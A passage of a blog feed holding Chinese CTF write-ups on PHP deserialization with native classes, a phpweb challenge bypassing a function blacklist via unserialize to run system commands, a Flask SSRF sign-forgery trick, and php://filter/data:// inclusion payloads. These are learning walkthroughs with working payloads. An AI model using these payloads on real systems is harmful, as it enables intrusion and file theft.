href="https://blog.csdn.net/qq_45521281/article/details/106062114?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161866246816780265464819%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161866246816780265464819&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-106062114.first_rank_v2_pc_rank_v29&utm_term=xxe%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91&spm=1018.2226.3001.4449">XXE与XXE漏洞学习</a></p>]]></content>
      
      
      <categories>
          
          <category> test60 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF总结——php原生类在反序列化的利用</title>
      <link href="test59/undefined-undefined.html"/>
      <url>test59/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>上次打DASCTF比赛的题目还是有很多没有见过的新的知识点的，这几天开始复现了，那么就总结一下。  </p><p>首先就是php原生类在反序列的利用，这个是第一次见。  </p><h1 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h1><p>打开题目，得到源码：  </p><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);class A&#123;public $class;public $para;public $check;public function __construct()&#123;    $this-&gt;class = &quot;B&quot;;    $this-&gt;para = &quot;ctfer&quot;;    echo new  $this-&gt;class ($this-&gt;para);&#125;public function __wakeup()&#123;    $this-&gt;check = new C;    if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;        echo new  $this-&gt;class ($this-&gt;para);    &#125;    else        die(&#39;bad hacker~&#39;);&#125;&#125;class B&#123;var $a;public function __construct($a)&#123;    $this-&gt;a = $a;    echo (&quot;hello &quot;.$this-&gt;a);&#125;&#125;class C&#123;function vaild($code)&#123;    $pattern = &#39;/[!|@|#|$|%|^|&amp;|*|=|\&#39;|&quot;|:|;|?]/i&#39;;    if (preg_match($pattern, $code))&#123;        return false;    &#125;    else        return true;&#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;$a=new A;&#125; hello ctfer </code></pre><p>一眼就能看出是反序列化，但是在仔细看却傻眼了，这代码里面找不到可以执行命令语句的函数漏洞，也找不到可以反弹shell的方法，这样看来就只是一串反序列化代码罢了。  </p><p>那么我们就先分析一下代码吧。  </p><p>首先是A类</p><pre><code>class A&#123;public $class;public $para;public $check;public function __construct()&#123;    $this-&gt;class = &quot;B&quot;;    $this-&gt;para = &quot;ctfer&quot;;    echo new  $this-&gt;class ($this-&gt;para);&#125;public function __wakeup()&#123;    $this-&gt;check = new C;    if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;        echo new  $this-&gt;class ($this-&gt;para);    &#125;    else        die(&#39;bad hacker~&#39;);&#125;  </code></pre><p>定义了三个变量，里面有一个__wakeup()方法，也就是说如果调用A类就会先调用这个方法，我们来看一下这个方法的操作。  </p><pre><code>$this-&gt;check = new C;    if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;        echo new  $this-&gt;class ($this-&gt;para);    &#125;    else        die(&#39;bad hacker~&#39;);</code></pre><p>可以看到，它先调用了C类，然后进行一个if判断语句，并且调用了C类中的vaild函数。如果判断为真，那么就执行输出$this-&gt;class ($this-&gt;para)这样的形式。  </p><p>那么我们接下来就分析C类代码：  </p><pre><code>class C&#123;function vaild($code)&#123;    $pattern = &#39;/[!|@|#|$|%|^|&amp;|*|=|\&#39;|&quot;|:|;|?]/i&#39;;    if (preg_match($pattern, $code))&#123;        return false;    &#125;    else        return true;&#125;&#125;</code></pre><p>很明显，C类中的vaild函数是一个正则匹配，匹配传入的参数。也就是A类中的$para,$class，如果匹配到黑名单中的字符，就返回false，没有就返回ture。  </p><p>接着我们看回A类，可以看到一开始默认设置的$class和$para:  </p><pre><code>public $class;public $para;public $check;public function __construct()&#123;    $this-&gt;class = &quot;B&quot;;    $this-&gt;para = &quot;ctfer&quot;;    echo new  $this-&gt;class ($this-&gt;para);&#125;  </code></pre><p>最开始默认的是给class赋值为B类，para赋值为ctfer，那么我们来看B类具体是什么。  </p><pre><code>class B&#123;var $a;public function __construct($a)&#123;    $this-&gt;a = $a;    echo (&quot;hello &quot;.$this-&gt;a);&#125;&#125; </code></pre><p>B类很简单，接受一个传入的参数a，然后打印”hello $a”。  </p><p>至此我们可以整理一下这个反序列化的大体思路，我们给A类中的$class.$para赋值，然后这两个属性经过C类中的正则匹配，如果没问题，那么就会执行形如class(para)这样的类的调用或者函数调用。  </p><p>一开始的想法肯定是构造命令执行函数，比如赋值class=syste；para=’ls’，但是这样无法通过正则匹配，而这个反序列化中也找不到别的危险函数，那么该怎么做呢？  </p><p><strong>这里就要用到php中的原生类了。</strong>   </p><p>由名字就可以知道，原生类就是php本来内置的类，这些类中的某些是可以被我们所利用的。  </p><pre><code>SLP类中存在能够进行文件处理和迭代的类：类                     描述DirectoryIterator    遍历目录FilesystemIterator    遍历目录GlobIterator        遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*SplFileObject        读取文件，按行读取，多行需要遍历finfo/finfo_open()    需要两个参数   </code></pre><p>这个是一部分我们能利用的，而这道题我们就要用到它们。  </p><p>首先我们要读取目录，因为system()等函数无法使用，那么我们就使用FilesystemIterator这个原生类来历遍目录，那么我们这样构造pop：  </p><pre><code>&lt;?phpclass A&#123;public $class=&#39;FilesystemIterator&#39;;public $para=&quot;/var/www/html&quot;;public $check;&#125;$o  = new A();echo serialize($o);?&gt;  </code></pre><p>构造payload:   </p><pre><code>/?pop=O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:13:&quot;/var/www/html&quot;;s:5:&quot;check&quot;;N;&#125;  </code></pre><p>得到目录下文件  </p><p><a href="https://img.imgdb.cn/item/606dd6ae8322e6675c570362.png"><img src="https://img.imgdb.cn/item/606dd6ae8322e6675c570362.png"></a>  </p><p>flag就在这个文件夹中，名字使flag.php那么我们用SplFileObject    这个原生类构造pop链：  </p><pre><code>&lt;?phpclass A&#123;public $class=&#39;SplFileObject&#39;;public $para=&quot;/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;;public $check;&#125;$o  = new A();echo serialize($o);?&gt;  </code></pre><p>构造payload：  </p><pre><code>/?pop=O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;para&quot;;s:56:&quot;/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;;s:5:&quot;check&quot;;N;&#125;   </code></pre><p>得到flag。  </p><p><a href="https://img.imgdb.cn/item/606dd7618322e6675c57e9fc.png"><img src="https://img.imgdb.cn/item/606dd7618322e6675c57e9fc.png"></a>  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题给了我一个新的解决php反序列化题目的思路，那就是利用php中内置的原生类，当我们发现代码中没有什么危险函数时就可以考虑这个方法，这样就可以不通过危险函数也能读取文件内容。  </p><p>关于php原生类的题目目前遇到的还少，以后遇到再接着补充。  </p><p>附上原生类链接：  </p><p><a href="https://www.php.net/manual/zh/book.spl.php">PHP标准库 (SPL)</a></p>]]></content>
      
      
      <categories>
          
          <category> test59 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习12</title>
      <link href="test58/undefined-undefined.html"/>
      <url>test58/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天做了一道简单的反序列化题目。  </p><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>打开题目，发现一个报错页面。  </p><p><a href="https://img.imgdb.cn/item/606ac7028322e6675c79d118.png"><img src="https://img.imgdb.cn/item/606ac7028322e6675c79d118.png"></a>  </p><p>这个报错界面一直在刷新，所以直接抓包尝试一下。  </p><p><a href="https://img.imgdb.cn/item/606ac7478322e6675c7a12e5.png"><img src="https://img.imgdb.cn/item/606ac7478322e6675c7a12e5.png"></a>  </p><p>抓包后的界面看起来没有什么提示，找了半天也不知道怎么操作，看了别人的wp后发现要用下方这两个上传的参数。  </p><p>我们这样构造：  </p><pre><code>func=file_get_contents&amp;p=index.php</code></pre><p>很明显这里func参数是一个函数，p是函数里的参数，至于如何判断出来的我也没找到解释，只能说ctf大佬的直觉吧。。。。   </p><p>这样构造后我们就能得到网页源码，整理如下：  </p><pre><code>&lt;?php$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) &#123;$result = call_user_func($func, $p);$a= gettype($result);if ($a == &quot;string&quot;) &#123;    return $result;&#125; else &#123;return &quot;&quot;;&#125;&#125;class Test &#123;var $p = &quot;Y-m-d h:i:s a&quot;;var $func = &quot;date&quot;;function __destruct() &#123;    if ($this-&gt;func != &quot;&quot;) &#123;        echo gettime($this-&gt;func, $this-&gt;p);    &#125;&#125;&#125;$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) &#123;$func = strtolower($func);if (!in_array($func,$disable_fun)) &#123;    echo gettime($func, $p);&#125;else &#123;    die(&quot;Hacker...&quot;);&#125;&#125;?&gt;  </code></pre><p>很明显可以看出这是一道反序列化的题目，在Test类中，当我们给属性p和属性func赋值时会触发__destruct() 方法，这个方法会将值赋给p和func并且执行gettime()函数。  </p><p>我们跟进一下这个gettime函数，发现这个函数里调用了call_ user_func()函数，这个函数比较少见，它的作用很简单，就是把第一个参数作为回调函数调用。   </p><pre><code>call_user_func ( callable $callback , mixed $parameter = ? , mixed $... = ? ) : mixed第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。返回值时返回回调函数的返回值。</code></pre><p>这也就解释了为什么我们在一开始上传func为函数名，p为参数却可以返回执行这个函数的结果。  </p><p>那么这道题重点就在这个gettime()函数上了。最开始的思路就是上传func为一个命令执行函数，p为执行的语句，然后得到flag，但是我们可以看到，如果我们直接上传func，他会经过一个正则匹配。  </p><pre><code>if ($func != null) &#123;$func = strtolower($func);if (!in_array($func,$disable_fun)) &#123;    echo gettime($func, $p);&#125;else &#123;    die(&quot;Hacker...&quot;);&#125;  </code></pre><p>这个匹配里有一个黑名单，在代码的一开始就列了出来。  </p><pre><code>&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;  </code></pre><p>可以看到，他过滤了很多命令执行函数，也就是说我们不能直接构造func=system&amp;p=ls这样的payload，那么我们就要想办法绕过这个黑名单。  </p><p>我们已经知道，这个黑名单只是过滤了func，而对p没有进行匹配，那么我们就可以考虑使用p来执行rce。  </p><p>我们前面已经看到了有一个Test类，而这个类里也调用了grttime()函数，同样有func和p属性，那么我们是不是可以用反序列化来绕过匹配呢？  </p><p>可以看到，黑名单中没有过滤反序列化函数，那么我们就可以使func=unserialize，然后用p来构造序列化后的字符串，如下所示：  </p><pre><code>&lt;?phpclass Test &#123;var $p = &quot;ls&quot;;var $func = &quot;system&quot;;function __destruct() &#123;    if ($this-&gt;func != &quot;&quot;) &#123;        echo gettime($this-&gt;func, $this-&gt;p);    &#125;&#125;&#125;$a=new Test();echo serialize($a); </code></pre><p>得到的序列化： </p><pre><code>O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;  </code></pre><p>那么我们这样构造：  </p><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;  </code></pre><p>这样func作为函数执行将p的参数反序列化，而p可以执行Test类中的gettime()函数，从而达成了使用p来执行命令执行函数的目的。  </p><p>得到文件目录：  </p><p><a href="https://img.imgdb.cn/item/606acebe8322e6675c82156f.png"><img src="https://img.imgdb.cn/item/606acebe8322e6675c82156f.png"></a>  </p><p>查了根目录也没找到flag在哪，那么换一种方式查flag。  </p><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;  </code></pre><p>这里的find / -name flag*语句是查询所有名字为flag的文件。  </p><p><a href="https://img.imgdb.cn/item/606acf2d8322e6675c828116.png"><img src="https://img.imgdb.cn/item/606acf2d8322e6675c828116.png"></a>  </p><p>看到这个/tmp/flagoefiu4r93有点可疑，那么查看一下这个文件内容。  </p><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;  </code></pre><p><a href="https://img.imgdb.cn/item/606acf958322e6675c82e359.png"><img src="https://img.imgdb.cn/item/606acf958322e6675c82e359.png"></a>  </p><p>确实这个文件就是flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目其实没有那么难，主要还是对于刚开始func和p参数的作用的猜测，用这两个参数获得题目源码，从而进行下一步，如果积累够多，其实可以推测出func就是call_ user_func()函数，也就避免了兜兜转转。</p><p>关于反序列化，还是找可执行函数和构造pop链，还是要多练才行。</p>]]></content>
      
      
      <categories>
          
          <category> test58 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关flack框架的ssrf</title>
      <link href="test57/undefined-undefined.html"/>
      <url>test57/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天做到了一道和以往都不同的ssrf题目，现在记录下来。扩展一下自己的见识。  </p><h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>题目说的很明白，就是ssrf题目，那么打开题目，发先代码好像有点不对劲。  </p><p><a href="https://img.imgdb.cn/item/606946698322e6675c200e1c.png"><img src="https://img.imgdb.cn/item/606946698322e6675c200e1c.png"></a>  </p><p>代码有点乱，需要整理一下，整理后如下。  </p><pre><code>#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#39;latin1&#39;)app = Flask(__name__)secert_key = os.urandom(16)class Task:def __init__(self, action, param, sign, ip):    self.action = action    self.param = param    self.sign = sign    self.sandbox = md5(ip)    if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr        os.mkdir(self.sandbox)def Exec(self):    result = &#123;&#125;    result[&#39;code&#39;] = 500    if (self.checkSign()):        if &quot;scan&quot; in self.action:            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)            resp = scan(self.param)            if (resp == &quot;Connection Timeout&quot;):                result[&#39;data&#39;] = resp            else:                print(resp)                tmpfile.write(resp)                tmpfile.close()            result[&#39;code&#39;] = 200        if &quot;read&quot; in self.action:            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)            result[&#39;code&#39;] = 200            result[&#39;data&#39;] = f.read()        if result[&#39;code&#39;] == 500:            result[&#39;data&#39;] = &quot;Action Error&quot;    else:        result[&#39;code&#39;] = 500        result[&#39;msg&#39;] = &quot;Sign Error&quot;    return resultdef checkSign(self):    if (getSign(self.action, self.param) == self.sign):        return True    else:        return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])def geneSign():param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))action = &quot;scan&quot;return getSign(action, param)@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])def challenge():action = urllib.unquote(request.cookies.get(&quot;action&quot;))param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))ip = request.remote_addrif(waf(param)):    return &quot;No Hacker!!!!&quot;task = Task(action, param, sign, ip)return json.dumps(task.Exec())@app.route(&#39;/&#39;)def index():return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param):socket.setdefaulttimeout(1)try:    return urllib.urlopen(param).read()[:50]except:    return &quot;Connection Timeout&quot;def getSign(action, param):return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):return hashlib.md5(content).hexdigest()def waf(param):check=param.strip().lower()if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):    return Trueelse:    return Falseif __name__ == &#39;__main__&#39;:app.debug = Falseapp.run(host=&#39;0.0.0.0&#39;,port=80)  </code></pre><p>好家伙，第一次看到这么长的代码，而且很明显这个不是php代码，在开头也说明了from flask import Flask，说明这个是py的flask框架，这个框架我们之前遇到过，但是考察的一般都是ssti注入，而这次它来考察我们ssrf，也就是说我们第一步就是要进行代码审计。  </p><p>其实flask框架的代码与之前我们认识的代码原理上没有太大的差距（就好比学会了c语言，别的语言也能触类旁通一样），只要学过别的语言，对于这一大段代码还是能看懂七七八八的。而这里最大的不同就是多了一个路由的概念，就像下面的这些：  </p><pre><code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])def geneSign():param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))action = &quot;scan&quot;return getSign(action, param)@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])def challenge():action = urllib.unquote(request.cookies.get(&quot;action&quot;))param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))ip = request.remote_addrif(waf(param)):    return &quot;No Hacker!!!!&quot;task = Task(action, param, sign, ip)return json.dumps(task.Exec())@app.route(&#39;/&#39;)def index():return open(&quot;code.txt&quot;,&quot;r&quot;).read()  </code></pre><p>可以看到有@app.route开头的字符，这个就是路由的标志，关于路由有以下作用：   </p><pre><code>在这个小的应用里，值得注意的是路由的使用，即@app.route()。这个路由便是之前说的装饰器，也就是说flask通过装饰器来识别用户需要访问的网址路径，并在对应的网址路径里做对应的应用。  </code></pre><p>用我的理解，这个就相当于编程里的一个自定义的一个函数，用户通过get或者post方式访问不同的网址，也就是**/geneSign<strong>或者</strong>/De1ta**然后就会触发相应的函数的操作，所以这道题目也就是让我们通过这些给出的网址路径来进行ssrf攻击，那么我们首先应该分析的就是这三个路由以及里面的操作了。  </p><p>对于这道题我们只需分析前两个路由即可，第三个就是正常的路由。</p><p>首先看到第一个路由/geneSign</p><pre><code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])def geneSign():param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))action = &quot;scan&quot;return getSign(action, param)  </code></pre><p>看到网址路径是/geneSign，方式是get，上传的变量是param，而action变量的值被固定了，是“scan”，最后返回经过函数getsign(action, param)操作后的值，那么我们跟进一下函数getsign()。  </p><pre><code>def getSign(action, param):return hashlib.md5(secert_key + param + action).hexdigest()  </code></pre><p>可以看到函数getsign()会接受action和param的值，然后进行一个md5加密，最后返回加密后的值，其中md5加密方式是**md5(secert_key + param + action)**其中secert _key的值我们是不知道的。  </p><p>接下来看第二个路由/De1ta。  </p><pre><code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])def challenge():action = urllib.unquote(request.cookies.get(&quot;action&quot;))param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))ip = request.remote_addrif(waf(param)):return &quot;No Hacker!!!!&quot;task = Task(action, param, sign, ip)return json.dumps(task.Exec())  </code></pre><p>和上个相同，网址路径是/De1ta上传方式是get，上传的变量是action，param，sign，<strong>这里注意action和sign是通过cookies来上传的，和param不同</strong>。接下来会对param的参数进行一个waf()的检测，如果通过了检测就可以将这四个值传进Task类，然后将其赋值给变量task，而task会进行Exec()函数操作，最后返回Exec()函数操作后的值。  </p><p>那么我们先看一下waf()函数过滤了什么。  </p><pre><code>def waf(param):check=param.strip().lower()if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):return Trueelse:return False  </code></pre><p>很明显，过滤了协议的开头，使我们无法通过伪协议来读取文件。  </p><p>接下来我们看一下Task类是什么。  </p><pre><code>class Task:def __init__(self, action, param, sign, ip):self.action = actionself.param = paramself.sign = signself.sandbox = md5(ip)if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr    os.mkdir(self.sandbox)  </code></pre><p>就是正常的赋值，ip经过了一个md5的加密，但是对于我们这道题ip没有什么影响。  </p><p>然后我们来看最重点的Exec()函数。  </p><pre><code>def Exec(self):result = &#123;&#125;result[&#39;code&#39;] = 500if (self.checkSign()):    if &quot;scan&quot; in self.action:        tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)        resp = scan(self.param)        if (resp == &quot;Connection Timeout&quot;):            result[&#39;data&#39;] = resp        else:            print(resp)            tmpfile.write(resp)            tmpfile.close()        result[&#39;code&#39;] = 200    if &quot;read&quot; in self.action:        f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)        result[&#39;code&#39;] = 200        result[&#39;data&#39;] = f.read()    if result[&#39;code&#39;] == 500:        result[&#39;data&#39;] = &quot;Action Error&quot;else:    result[&#39;code&#39;] = 500    result[&#39;msg&#39;] = &quot;Sign Error&quot;return result</code></pre><p>可以看到，这个函数会先进行一个checkSign()函数的检验，如果通过才能进行下面的if语句，我们跟进一下这个函数。  </p><pre><code>def checkSign(self):if (getSign(self.action, self.param) == self.sign):    return Trueelse:    return False  </code></pre><p>可以看到这个函数会将action和param的值传入getsign()函数，然后用getsgin()函数返回的值和sign的值进行对比，如果相同就返回真，反之就返回假。对于getsign()函数我们之前已经分析过了，他就是一个md5加密：md5(secert_key + param + action)但是我们并不知道sign的值，我们先跳过这一点，接着往下看：  </p><p>可以看到如果我们通过检测，接下来会有两个if语句判断：  </p><pre><code>if &quot;scan&quot; in self.action:    tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)    resp = scan(self.param)    if (resp == &quot;Connection Timeout&quot;):        result[&#39;data&#39;] = resp    else:        print(resp)        tmpfile.write(resp)        tmpfile.close()    result[&#39;code&#39;] = 200if &quot;read&quot; in self.action:    f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)    result[&#39;code&#39;] = 200    result[&#39;data&#39;] = f.read()  </code></pre><p>如果action参数里有scan字符，那么他会执行下面的操作：  </p><pre><code>tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)    resp = scan(self.param)  .....print(resp)    tmpfile.write(resp)    tmpfile.close()</code></pre><p>不难看出，这个就是将param的参数内容写入文件，而下面的if语句大体相同：  </p><pre><code>if &quot;read&quot; in self.action:    f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)    result[&#39;code&#39;] = 200    result[&#39;data&#39;] = f.read()  </code></pre><p>如果action参数里有read字符，那么他就会读取文件的内容。  </p><p>到这里就很明白了，题目想让我们用的就是这个write和read，由于题目刚开始就给出了提示flag再./flag.txt里，那么我们只需要让action里有write和read字符，然后利用param上传flag.txt，这样就能将flag.txt内容写入并且读出。  </p><p>接下来要解决的就是如何通过Exec()函数的第一个检测了，我们已经知道要使md5(secert_key + param + action)==sign，而param我们要使其为flag.txt,action要为write+read。而这个sign的值是我们通过get方式上传的，所以上传的sign的值应该是这样的： </p><pre><code>md5(secert_keyflag.txtscanread)//加号可省略  </code></pre><p>那么哪里还用到了getsign()函数呢？没错，就是第一个路由：  </p><pre><code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])def geneSign():param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))action = &quot;scan&quot;return getSign(action, param)  </code></pre><p>可以看到，这个同样是将action和param进行getsign的操作。<strong>但是它可以返回加密后的结果，</strong>这不就能解决sign值的问题了吗？不同的就是这里action的值是固定的scan，但是param可以控制，那么我们可以拼接一下让action的值变成scanread:  </p><p>我们这样上传：/geneSign?param=flag.txtread（注意这里用到的是/geneSign路由），这样由于md5()函数中+号可以省略，最后的函数就是</p><pre><code>md5(secert_key+flag.txtread+scan)也就是md5(secert_keyflag.txtreadscan)</code></pre><p>这样就返回了我们需要的sign的值：  </p><p><a href="https://img.imgdb.cn/item/6069578e8322e6675c34bad9.png"><img src="https://img.imgdb.cn/item/6069578e8322e6675c34bad9.png"></a>  </p><p>接下来就是通过/De1ta路由写入和读出flag.txt了，我们抓包来构造：  </p><p><a href="https://img.imgdb.cn/item/606957f98322e6675c3514bb.png"><img src="https://img.imgdb.cn/item/606957f98322e6675c3514bb.png"></a>  </p><p>可以看到，我们通过/De1ta路由上传param的参数为flag.txt。</p><p>通过cookie上传action=readscan。  </p><p>sign为md5(secert_key+flag.txtread+scan)的值。  </p><p>这样就满足了刚开始的检测，同时又满足了action为scanread，以此来写入和读取文件。从而得到flag.txt内容。得到flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目其实挺新颖的，说是考察了ssrf，但是其实也就是通过特定的路由来执行文件的读取，和一般的ssrf通过image参数构造?image=www…有相同之处。  </p><p>但是这道题目主要考察的还是代码审计能力，也就是对于flask框架下的代码的审计和理解，虽然一眼看到的代码很长，但是只要抓住关键，<strong>也就是先审计路由，再由路由跟进函数，最后找到可以执行的漏洞函数，</strong>通过不同路由的联系最后构造payload，得到flag。  </p><p>总的来说，对于这种题，一是自己的知识面要广，认识不同的代码，二是代码的审计能力要强。  </p><p>附上关于flask框架的简单介绍：  </p><p><a href="https://blog.csdn.net/qq_38664371/article/details/80352102">Flask框架快速入门学习（1）</a></p>]]></content>
      
      
      <categories>
          
          <category> test57 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>replace()函数漏洞</title>
      <link href="test56/undefined-undefined.html"/>
      <url>test56/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天buu刷题，写了一道关于replace()函数漏洞的题目，感觉比较少见，现在记录一下。  </p><h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>打开题目，看到源码。  </p><p><a href="https://img.imgdb.cn/item/6066b9e08322e6675cb9b9f2.png"><img src="https://img.imgdb.cn/item/6066b9e08322e6675cb9b9f2.png"></a>  </p><p>可以看到，get方式上传text和file参数，首先要满足上传的text是一个文件，并且这个文件中有”I have a dream”字符串。  </p><pre><code>file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;这里的r参数表示只读形式打开。  </code></pre><p>满足第一个条件后接下来有一个正则匹配，过滤了flag字符，而我们上传的file参数就进入了include()函数里。  </p><p>很明显，这道题第一步要用include()函数来读取文件，不能读取flag，那就读取它给我们的提示：next.php。  </p><p>而第一个text传参很明显我们可以利用data://伪协议来写入内容，第二个include函数我们可以使用php://filter协议来读取文件。  </p><p>于是构造payload。  </p><pre><code>?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php  这里data://伪协议中的plain后面跟上的就是写入的内容。  </code></pre><p>进入下一个界面，得到了next.php源码。  </p><p><a href="https://img.imgdb.cn/item/6066bc868322e6675cbe53b3.png"><img src="https://img.imgdb.cn/item/6066bc868322e6675cbe53b3.png"></a>  </p><p>解码后得到源码。  